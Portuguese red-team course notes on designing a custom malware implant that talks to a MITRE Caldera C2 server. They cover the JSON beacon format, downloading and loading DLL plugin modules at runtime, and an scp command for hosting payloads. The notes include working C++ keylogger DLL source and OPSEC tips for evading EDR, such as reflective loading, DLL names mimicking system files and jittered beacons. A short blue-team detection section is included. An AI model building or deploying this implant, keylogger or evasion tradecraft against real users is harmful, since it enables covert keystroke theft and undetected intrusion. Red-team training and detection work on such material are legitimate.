---
title: "C2 Protocol Design"
---

# Design de Protocolo C2 Customizado e Framework de Plugins

## Implant Custom Para APT Realista

Ferramentas comerciais como Cobalt Strike têm assinatura conhecida e caem em EDR moderno. Pra engagements avançados e simulação de APT real, equipes de red team desenvolvem implant customizado com protocolo proprietário. Este módulo (MalTrak 05) cobre design de comunicação JSON com MITRE Caldera, framework de plugins/módulos de malware, e upload/download de payloads via Caldera.

---

## Técnicas MalTrak - Módulo 05

### Comunicacao JSON com C2 (Caldera)

#### Fundamentos do Formato JSON

JSON (JavaScript Object Notation) é o formato de comunicacao escolhido pelo Caldera e por muitos C2 frameworks modernos por ser:
- Formato padrão para representacao de dados estruturados
- Suporta texto, listas, arrays e árvores de dados
- Representa praticamente qualquer tipo de dado
- Possui bibliotecas de parsing em todas as linguagens relevantes

#### Caldera e Comunicacao JSON

O MITRE Caldera utiliza JSON como protocolo de comunicacao agente-servidor. O implante (agente) precisa:

1. **Parsear** o JSON recebido do servidor Caldera para extrair instruçoes
2. **Criar** mensagens JSON para enviar resultados de volta ao Caldera

**Biblioteca recomendada (C++):** `nlohmann/json`
- Repositório: https://github.com/nlohmann/json
- Header-only, simples de integrar

#### Formato da Mensagem Caldera

O servidor Caldera envia instruçoes em JSON. O agente precisa extrair:
- **paw**: identificador único do agente (ex: `"lktfvl"`)
- **sleep**: tempo de espera entre polls (sleep time)
- **instructions**: comandos codificados (base64) a executar

O agente envia resultado de volta no formato:
```json
{
  "paw": "lktfvl",
  "results": [
    {
      "id": "9ea0b6a3-f7e1-4338-930a-b0d21d282b59",
      "output": "ICB9ClOK...{base64 encoded output}",
      "status": "0",
      "pid": "23812"
    }
  ]
}
```

**Campos obrigatórios na resposta:**
- `paw`: ID do agente (obtido do poll inicial)
- `results`: array de resultados
- `id`: UUID da instrucao executada
- `output`: saida codificada em base64
- `status`: código de saida do comando (`"0"` = sucesso)
- `pid`: PID do processo que executou o comando

#### Exercício: Parsear Mensagem Caldera

Passos do exercício do módulo:
1. Usar a biblioteca `nlohmann/json` (Module05\json.zip)
2. Parsear output do Caldera: extrair `paw`, `sleep` e `instructions`
3. Decodificar as instruçoes (base64)
4. Enviar output vazio de volta ao Caldera

---

### Framework de Plugins/Módulos de Malware

#### Por Que APTs Usam Módulos

Muitos ataques APT reais incluem um sistema de plugins/módulos no malware:
- **Modularidade**: módulos estendem funcionalidade apenas quando necessário
- **Economia**: reduz footprint inicial (menor binário = menor chance de detecção)
- **Flexibilidade**: podem escalar privilégios, roubar senhas, monitorar teclado
- **Exemplo real**: malware Regin (atribuído à NSA) usava mais de 100 módulos

#### Plano de Implementacao do Framework de Módulos

Para implementar um framework de plugins em C++:

**Passo 1 - Adicionar projeto DLL separado**
- Criar um novo projeto DLL na solucao Visual Studio
- Este DLL será o módulo/plugin

**Passo 2 - Definir linguagem universal**
- Criar uma interface/contrato entre malware principal e módulos
- Função exportada padrão que o malware sabe chamar

**Passo 3 - Upload/Download de módulos**
- Fazer upload dos módulos compilados para o Caldera (pasta `static/`)
- O malware faz download sob demanda quando o C2 envia o comando

**Passo 4 - Comandos especiais por módulo**
- Adicionar comandos específicos no malware para cada módulo criado

#### Upload de Payloads para o Caldera

Arquivos podem ser hospedados no Caldera para download posterior:

**Localização no servidor:**
- Pasta: `caldera/static/`
- URL de acesso: `http://<caldera_ip>:8888/gui/<seu_arquivo>`

**Comando SCP para upload (Linux/Mac):**
```bash
scp -i ec2_key_pair <caminho_local> ec2-user@<caldera-ip>:/home/ec2-user/caldera/static
```

Este método permite hospedar:
- Payloads de acesso inicial
- Módulos/plugins do malware
- Ferramentas auxiliares

#### Carregamento de Módulos (DLLs) em Runtime

Para carregar DLLs dinamicamente dentro do processo do malware, usar a API do Windows:

**API `LoadLibrary`:**
```cpp
// Carrega a DLL e retorna handle
HMODULE hModule = LoadLibraryA("C:\\caminho\\para\\modulo.dll");
if (hModule == NULL) {
    // Erro ao carregar
}
```

**API `GetProcAddress`:**
```cpp
// Obtém endereço de função exportada pela DLL
typedef void (*ModuleFunc)();
ModuleFunc func = (ModuleFunc)GetProcAddress(hModule, "NomeDaFuncao");
if (func) {
    func();  // Chama a função do módulo
}
```

**Fluxo completo:**
1. C2 envia comando com nome/URL do módulo
2. Malware faz download do módulo (DLL) via HTTP
3. Salva em disco (ou injeta direto na memória)
4. Chama `LoadLibrary` com o caminho
5. Usa `GetProcAddress` para chamar as funções exportadas
6. Executa funcionalidade do módulo
7. Reporta resultado ao C2

#### Módulo Keylogger - Implementação

O módulo keylogger é o exemplo prático do curso. Usa duas APIs do Windows:

**`GetAsyncKeyState(vKey)`**
- Retorna o estado de qualquer tecla (pressionada ou nao)
- Parâmetro: código da tecla virtual (Virtual Key Code)
- Retorno: bit mais alto = 1 se tecla pressionada agora
- Exemplo: `GetAsyncKeyState(VK_RETURN)` verifica Enter

**`CreateThread`**
- Cria thread paralela para captura de teclas
- O keylogger roda em thread separada enquanto o malware continua operando
- Garante captura contínua sem bloquear comunicacao C2

**Estrutura básica do keylogger (C++):**
```cpp
#include <windows.h>
#include <fstream>
#include <string>

// Função executada na thread do keylogger
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    std::ofstream logfile("keys.txt", std::ios::app);
    
    while (true) {
        // Verificar todas as teclas relevantes
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                // Tecla pressionada
                logfile << (char)key;
                logfile.flush();
                Sleep(50); // Evita duplicatas
            }
        }
        Sleep(10);
    }
    return 0;
}

// Função exportada - ponto de entrada do módulo
extern "C" __declspec(dllexport) void StartKeylogger() {
    HANDLE hThread = CreateThread(
        NULL,           // atributos de segurança
        0,              // tamanho do stack
        KeyloggerThread, // função da thread
        NULL,           // parâmetro
        0,              // flags de criação
        NULL            // ID da thread
    );
    // hThread pode ser guardado para StopKeylogger
}
```

**Referência completa:** `Module05\keylogger.zip`

---

### Mapeamento MITRE ATT&CK - Módulo 05

| Técnica | ID MITRE | Descrição |
|---------|----------|-----------|
| Ingress Tool Transfer | T1105 | Download de módulos do C2 para a vítima |
| Dynamic-link Library Injection | T1055.001 | LoadLibrary para carregar módulos |
| Input Capture: Keylogging | T1056.001 | Captura de teclas com GetAsyncKeyState |
| Application Layer Protocol: Web Protocols | T1071.001 | Comunicação HTTP/HTTPS com Caldera |
| Command and Scripting Interpreter | T1059 | Execução de instruções decodificadas |

---

### Indicadores de Detecção (Blue Team)

**Para comunicação JSON C2:**
- Requisições HTTP/S com padrão de beacon (intervalo regular)
- User-agent incomum ou ausente
- Corpo de POST com JSON contendo campos `paw`, `results`
- Conexões para IPs sem domínio ou domínios recém-registrados

**Para carregamento de DLL:**
- `LoadLibrary` chamado em processo não-padrão
- DLL carregada de caminho temporário (`%TEMP%`, `%APPDATA%`)
- Novo módulo DLL sem assinatura digital (não-assinado)
- Evento de criação de arquivo seguido imediatamente de `LoadLibrary`

**Para keylogger:**
- Processo chamando `GetAsyncKeyState` em loop
- Thread criada com `CreateThread` apontando para código suspeito
- Arquivo de log novo em caminho de usuário
- Processo com hook de teclado não esperado

**Ferramentas de detecção:**
- Process Monitor (Sysinternals): monitora chamadas de API e carregamento de DLL
- Sysmon: Event ID 7 (ImageLoad) para DLLs carregadas dinamicamente
- EDR: comportamento de polling + DLL load é assinatura de agente C2

---

### OPSEC ao Usar Framework de Módulos

1. **Criptografar DLLs em trânsito**: usar XOR ou AES para módulos baixados do C2
2. **Reflective DLL Loading**: carregar DLL direto da memória sem tocar disco
3. **Deletar módulo após uso**: remover DLL após execução para reduzir footprint
4. **Nomear módulos legitimamente**: usar nomes que imitam DLLs do sistema
5. **Ofuscar exports**: evitar nomes óbvios como `StartKeylogger` em produção
6. **Variar sleep time**: não usar intervalo fixo de poll para evitar detecção de beaconing
7. **Criptografar logs do keylogger**: nunca salvar em plaintext em disco

---

### Referências

- Caldera Framework: https://github.com/mitre/caldera
- nlohmann/json (C++ JSON parser): https://github.com/nlohmann/json
- Windows LoadLibrary API: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
- Regin Malware Analysis (módulos): https://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance
- GetAsyncKeyState MSDN: https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
- Reflective DLL Loading: https://github.com/stephenfewer/ReflectiveDLLInjection
